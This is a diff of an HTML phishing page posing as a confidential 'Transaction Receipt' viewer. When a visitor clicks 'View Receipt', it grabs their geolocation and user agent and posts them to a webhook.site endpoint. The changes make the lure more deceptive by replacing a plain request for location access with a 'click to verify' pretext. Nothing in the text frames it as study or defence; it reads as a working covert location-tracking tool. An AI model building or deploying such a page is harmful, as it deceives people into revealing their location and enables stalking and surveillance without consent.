@@ -1,35 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Bank Transaction Receipt</title>
+  <title>Transaction Receipt</title>
   <style>
     body {
       font-family: Arial, sans-serif;
+      background: #f7f7f7;
       text-align: center;
-      margin-top: 100px;
+      padding-top: 100px;
     }
     .container {
-      border: 1px solid #ccc;
+      background: white;
       padding: 40px;
-      width: 300px;
       margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 15px;
+      color: green;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Secure Receipt Viewer</h2>
-    <p>Loading receipt... please allow location access.</p>
-    <button onclick="getLocation()">View</button>
+    <p>This receipt is confidential. Click below to verify.</p>
+    <button onclick="getLocation()">View Receipt</button>
     <p id="status"></p>
   </div>
 
   <script>
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
         document.getElementById("status").innerText = "Requesting location...";
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
       } else {
         document.getElementById("status").innerText = "Geolocation not supported.";
       }
@@ -39,8 +51,8 @@
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
       const userAgent = navigator.userAgent;
+      const timestamp = new Date().toISOString();
 
-      // Replace below with your Webhook URL from webhook.site
       fetch("https://webhook.site/badbb57b-df0b-4339-9064-0e7ddc716651", {
         method: "POST",
         headers: {
@@ -50,15 +62,17 @@
           latitude: lat,
           longitude: lon,
           userAgent: userAgent,
-          timestamp: new Date().toISOString()
+          timestamp: timestamp
         })
+      }).then(res => {
+        document.getElementById("status").innerText = `Location sent successfully.`;
+      }).catch(err => {
+        document.getElementById("status").innerText = "Failed to send location.";
       });
-
-      document.getElementById("status").innerText = `Location sent: ${lat}, ${lon}`;
     }
 
     function showError(error) {
-      document.getElementById("status").innerText = "Error retrieving location.";
+      document.getElementById("status").innerText = "Permission denied or location error.";
     }
   </script>
 </body>
